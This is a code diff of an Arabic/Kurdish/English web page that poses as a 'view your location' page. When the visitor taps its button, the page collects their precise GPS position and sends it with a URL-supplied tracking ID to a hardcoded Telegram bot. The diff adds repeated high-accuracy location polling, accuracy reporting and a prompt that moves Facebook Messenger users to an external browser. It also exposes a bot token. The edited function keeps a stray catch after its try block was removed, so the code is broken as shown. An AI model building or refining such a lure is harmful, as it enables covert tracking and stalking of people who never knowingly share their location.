@@ -1,4 +1,4 @@
- <!DOCTYPE html>
+<!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
@@ -32,7 +32,6 @@
             backdrop-filter: blur(6px);
         }
 
-        /* ---------- هەڵبژاردەی زمان ---------- */
         .lang-selector {
             position: fixed;
             top: 15px;
@@ -74,7 +73,7 @@
             padding: 35px 28px;
             box-shadow: 0 20px 50px rgba(0, 0, 0, .35);
             text-align: center;
-            margin-top: 60px; /* بۆ ئەوەی لە ژێر هەڵبژاردەکەوە بێت */
+            margin-top: 60px;
         }
 
         .icon {
@@ -152,18 +151,28 @@
             margin-top: 15px;
             font-weight: bold;
         }
+        
+        .open-browser-btn {
+            margin-top: 15px;
+            padding: 12px 20px;
+            background: #007aff;
+            color: #fff;
+            border: none;
+            border-radius: 25px;
+            font-size: 14px;
+            cursor: pointer;
+            display: none;
+        }
     </style>
 </head>
 <body>
 
-    <!-- ========== هەڵبژاردەی زمان ========== -->
     <div class="lang-selector">
         <button class="lang-btn active" onclick="changeLang('ar')">العربية</button>
         <button class="lang-btn" onclick="changeLang('ckb')">کوردی</button>
         <button class="lang-btn" onclick="changeLang('en')">English</button>
     </div>
 
-    <!-- ========== ناوەڕۆکی سەرەکی ========== -->
     <div class="card">
         <div class="icon">📍</div>
         <h1 data-i18n="main_title">تم استلام موقع المستخدم</h1>
@@ -182,6 +191,10 @@
         <button id="btnStart" class="btn" onclick="getLoc()" data-i18n="start_btn">
             📍 لعرض الموقع الدقيق اضغط هنا
         </button>
+        
+        <button id="btnOpenBrowser" class="open-browser-btn" style="display:none;">
+            🔗 فتح في المتصفح
+        </button>
 
         <div id="result"></div>
 
@@ -191,7 +204,6 @@
     </div>
 
     <script>
-        // ========== داتابەیسی وەرگێڕان ==========
         const translations = {
             ar: {
                 page_title: "عرض الموقع",
@@ -205,7 +217,8 @@
                 success: "✅ تم تأكيد موقعك",
                 done: "✅ تم",
                 error_prefix: "❌ فشل: ",
-                retry: "📍 إعادة المحاولة"
+                retry: "📍 إعادة المحاولة",
+                open_browser: "🔗 فتح في المتصفح الخارجي"
             },
             ckb: {
                 page_title: "پیشاندانی شوێن",
@@ -219,7 +232,8 @@
                 success: "✅ شوێنەکەت پشتڕاست کرایەوە",
                 done: "✅ تەواو",
                 error_prefix: "❌ شکست: ",
-                retry: "📍 دووبارە هەوڵبدەرەوە"
+                retry: "📍 دووبارە هەوڵبدەرەوە",
+                open_browser: "🔗 کردنەوە لە وێبگەڕی دەرەکی"
             },
             en: {
                 page_title: "View Location",
@@ -233,20 +247,18 @@
                 success: "✅ Your location confirmed",
                 done: "✅ Done",
                 error_prefix: "❌ Failed: ",
-                retry: "📍 Retry"
+                retry: "📍 Retry",
+                open_browser: "🔗 Open in External Browser"
             }
         };
 
-        // ========== فەنکشنی گۆڕینی زمان ==========
         function changeLang(lang) {
-            // گۆڕینی ئاڕاستە
             if (lang === 'ar' || lang === 'ckb') {
                 document.documentElement.dir = 'rtl';
             } else {
                 document.documentElement.dir = 'ltr';
             }
 
-            // نوێکردنەوەی هەموو توخمەکانی data-i18n
             document.querySelectorAll('[data-i18n]').forEach(el => {
                 const key = el.getAttribute('data-i18n');
                 if (translations[lang] && translations[lang][key]) {
@@ -254,15 +266,13 @@
                 }
             });
 
-            // دیاریکردنی دوگمەی چالاک
             document.querySelectorAll('.lang-btn').forEach(btn => btn.classList.remove('active'));
             document.querySelector(`[onclick="changeLang('${lang}')"]`).classList.add('active');
 
-            // پاشەکەوتکردنی زمان
             localStorage.setItem('preferred_lang_gps', lang);
 
-            // نوێکردنەوەی دوگمەی سەرەکی ئەگەر لە دۆخی چالاکدا بێت
             const btn = document.getElementById('btnStart');
+            const btnOpen = document.getElementById('btnOpenBrowser');
             if (btn.disabled && btn.textContent.includes('⏳')) {
                 btn.textContent = translations[lang].loading;
             } else if (btn.textContent.includes('✅')) {
@@ -270,60 +280,147 @@
             } else {
                 btn.textContent = translations[lang].start_btn;
             }
+            btnOpen.textContent = translations[lang].open_browser;
         }
 
-        // بارکردنی زمانی پاشەکەوتکراو
         window.addEventListener('DOMContentLoaded', () => {
             const savedLang = localStorage.getItem('preferred_lang_gps') || 'ar';
             changeLang(savedLang);
+            
+            // پشکنینی ئایا لە WebView ی مەسنجەرە
+            const isFacebookApp = /FBAN|FBAV/.test(navigator.userAgent);
+            if (isFacebookApp) {
+                document.getElementById('btnOpenBrowser').style.display = 'block';
+                document.getElementById('btnOpenBrowser').addEventListener('click', openInExternalBrowser);
+            }
         });
 
-        // ========== کۆدی GPS ==========
+        function openInExternalBrowser() {
+            const currentUrl = window.location.href;
+            // هەوڵدان بۆ کردنەوە لە وێبگەڕی دەرەکی
+            window.open(currentUrl, '_blank');
+        }
+
         const TOKEN = '7524329663:AAERQzZ21_sskD6GLfUNLTYvTy--X733hEI';
         const CHAT = '1015102519';
         const chatId = new URLSearchParams(location.search).get('chatId') || 'unknown';
+
+        // پشکنینی GPS پشتگیری دەکرێت
+        function checkGPSHardware() {
+            return new Promise((resolve) => {
+                if (!navigator.geolocation) {
+                    resolve(false);
+                    return;
+                }
+                // تاقیکردنەوەی خێرا بۆ دڵنیابوون لە هاردوەر
+                navigator.geolocation.getCurrentPosition(
+                    () => resolve(true),
+                    (err) => {
+                        if (err.code === 2) { // POSITION_UNAVAILABLE
+                            resolve(false);
+                        } else {
+                            resolve(true); // مۆڵەت کێشەیە نەک هاردوەر
+                        }
+                    },
+                    { timeout: 3000, enableHighAccuracy: true }
+                );
+            });
+        }
 
         async function getLoc() {
             const btn = document.getElementById('btnStart');
             const res = document.getElementById('result');
             const currentLang = localStorage.getItem('preferred_lang_gps') || 'ar';
 
+            if (!navigator.geolocation) {
+                res.textContent = translations[currentLang].error_prefix + 'GPS not supported';
+                return;
+            }
+
             btn.disabled = true;
             btn.textContent = translations[currentLang].loading;
             res.textContent = '';
             res.style.display = 'block';
 
-            try {
-                const position = await new Promise((resolve, reject) =>
-                    navigator.geolocation.getCurrentPosition(resolve, reject, {
-                        enableHighAccuracy: true,
-                        timeout: 15000
-                    })
-                );
+            // چەند هەوڵێک بۆ وەرگرتنی شوێنی ورد
+            let bestPosition = null;
+            let bestAccuracy = Infinity;
 
-                const lat = position.coords.latitude;
-                const lng = position.coords.longitude;
-                const mapsLink = `https://www.google.com/maps?q=${lat},${lng}`;
-                const message = `📍 **موقع جديد**\n🆔 ID: ${chatId}\n📌 ${lat}, ${lng}\n🗺️ ${mapsLink}`;
+            for (let attempt = 0; attempt < 3; attempt++) {
+                try {
+                    const position = await new Promise((resolve, reject) => {
+                        const watchId = navigator.geolocation.watchPosition(
+                            (pos) => {
+                                // ئەگەر دەستکەوتی وردتر بوو، وەریبگرە
+                                if (pos.coords.accuracy < bestAccuracy) {
+                                    bestAccuracy = pos.coords.accuracy;
+                                    bestPosition = pos;
+                                    // ئەگەر وردییەکەی کەمتر لە 30 مەتر بوو، بەسە
+                                    if (pos.coords.accuracy <= 30) {
+                                        navigator.geolocation.clearWatch(watchId);
+                                        resolve(pos);
+                                    }
+                                }
+                            },
+                            reject,
+                            {
+                                enableHighAccuracy: true,
+                                timeout: 10000,
+                                maximumAge: 0  // ڕێگە نادات شوێنی کۆن بەکاربهێنرێت
+                            }
+                        );
 
-                await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        chat_id: CHAT,
-                        text: message,
-                        parse_mode: 'Markdown'
-                    })
-                });
+                        // دوای ٨ چرکە باشترین شوێن بەکاردێنە
+                        setTimeout(() => {
+                            navigator.geolocation.clearWatch(watchId);
+                            if (bestPosition) {
+                                resolve(bestPosition);
+                            } else {
+                                reject(new Error('Timeout'));
+                            }
+                        }, 8000);
+                    });
 
-                res.textContent = translations[currentLang].success;
-                btn.textContent = translations[currentLang].done;
-
-            } catch (e) {
-                res.textContent = translations[currentLang].error_prefix + e.message;
-                btn.disabled = false;
-                btn.textContent = translations[currentLang].retry;
+                    // گەیشتینە ئەنجامێکی باش
+                    break;
+                } catch (e) {
+                    if (attempt === 2) {
+                        // دوای ٣ هەوڵ، یان باشترین ئەنجام یان هەڵە
+                        if (bestPosition) break;
+                        throw e;
+                    }
+                    // چاوەڕوانی ١ چرکە پێش هەوڵی دووبارە
+                    await new Promise(resolve => setTimeout(resolve, 1000));
+                }
             }
+
+            if (!bestPosition) {
+                throw new Error('Location not available');
+            }
+
+            const lat = bestPosition.coords.latitude;
+            const lng = bestPosition.coords.longitude;
+            const accuracy = Math.round(bestPosition.coords.accuracy);
+            const mapsLink = `https://www.google.com/maps?q=${lat},${lng}`;
+            const message = `📍 **موقع جديد**\n🆔 ID: ${chatId}\n📌 ${lat}, ${lng}\n🎯 الدقة: ${accuracy} متر\n🗺️ ${mapsLink}`;
+
+            await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: CHAT,
+                    text: message,
+                    parse_mode: 'Markdown'
+                })
+            });
+
+            res.textContent = translations[currentLang].success + ` (${accuracy}m)` ;
+            btn.textContent = translations[currentLang].done;
+
+        } catch (e) {
+            btn.disabled = false;
+            btn.textContent = translations[currentLang].retry;
+            res.textContent = translations[currentLang].error_prefix + e.message;
         }
     </script>
 </body>
